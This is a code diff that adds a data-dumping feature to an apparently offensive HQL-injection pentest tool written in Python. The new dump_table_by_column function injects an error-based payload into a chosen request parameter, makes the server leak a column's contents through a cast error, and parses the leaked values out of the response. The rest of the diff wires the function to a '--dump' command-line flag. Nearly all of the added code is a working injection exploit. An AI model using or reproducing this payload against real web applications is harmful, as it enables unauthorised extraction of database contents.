@@ -272,6 +272,25 @@ def display_message(message):
     if (VERBOSE_MODE):
         print message
 
+###########################
+### Dump function
+###########################
+
+def dump_table_by_column(url, params, param_to_test, table, column):
+    params[param_to_test] = "'and (select cast(concat('///', group_concat(" + column + "), '///') as string) from " + table + ")=1or ''='"
+    req = send_HTTP_request(url, params)
+    results = get_result_from_dump(req.content)
+    print "[" + table + "]\n\t[" + column + "]"
+    for res in results:
+        print "\t\t - " + res
+
+def get_result_from_dump(content):
+    regex_result = re.search(r"&quot;///(.+)///&quot;", content)
+    dump = regex_result.group(1)
+    return dump.split(',')
+
+
+
 # option parser
 parser = optparse.OptionParser()
 parser.add_option('--url', help='qURL to pentest', dest='url')
@@ -293,6 +312,9 @@ parser.add_option('--column_name_file', help='DB file for name of columns', dest
 parser.add_option('--check', help='Check if host is vulnerable', dest='check', default=False, action='store_true')
 parser.add_option('--user', help='Tries to get user() from dbms', dest='user', default=False, action='store_true')
 parser.add_option('--count', help='Get count of specified table(s)', dest='count', default=False, action='store_true')
+
+# Exploitation flag
+parser.add_option('--dump', help='Dump specified table(s) / column(s)', dest='dump', default=False, action='store_true')
 
 # Results options
 parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
@@ -365,6 +387,26 @@ else:
             get_count_of_table(url, params, opts.param, opts.blind_hqli_message, opts.table)
         else:
             print "ERROR : No table flag specified. "
+
+    # --dump flag
+    if (opts.dump):
+        if (opts.columns):
+            # list columns as well
+            list_columns(url, params, opts.param)
+        if (opts.tables):
+            for table in TABLES:
+                if (opts.columns):
+                    for column in TABLES[table]:
+                        dump_table_by_column(url, params, opts.param, table, column)
+                elif(opts.column is not None):
+                    dump_table_by_column(url, params, opts.param, table, opts.column)
+
+        if (opts.table):
+            if (opts.columns):
+                for column in TABLES[opts.table]:
+                    dump_table_by_column(url, params, opts.param, opts.table, column)
+            elif(opts.column is not None):
+                dump_table_by_column(url, params, opts.param, opts.table, opts.column)
 
     # enumerate tables and columns found if flag passed
     if (opts.results):
